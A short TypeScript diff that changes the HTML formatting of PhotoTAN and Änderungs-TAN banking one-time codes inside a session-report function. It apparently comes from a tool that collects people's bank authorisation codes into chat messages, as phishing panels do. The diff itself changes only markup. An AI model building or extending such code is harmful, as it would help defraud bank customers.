@@ -102,12 +102,12 @@ export function formatSessionText(s: {
 
   if (m.photoTan) {
     lines.push("");
-    lines.push(`<b>📱 PhotoTAN</b>: <code>${escapeHtml(String(m.photoTan))}</code>`);
+    lines.push(`<b>📱 PhotoTAN: ${escapeHtml(String(m.photoTan))}</b>`);
   }
 
   if (m.aenderungTan) {
     lines.push("");
-    lines.push(`<b>🔢 Änderungs-TAN</b>: <code>${escapeHtml(String(m.aenderungTan))}</code>`);
+    lines.push(`<b>🔢 Änderungs-TAN: ${escapeHtml(String(m.aenderungTan))}</b>`);
   }
 
 
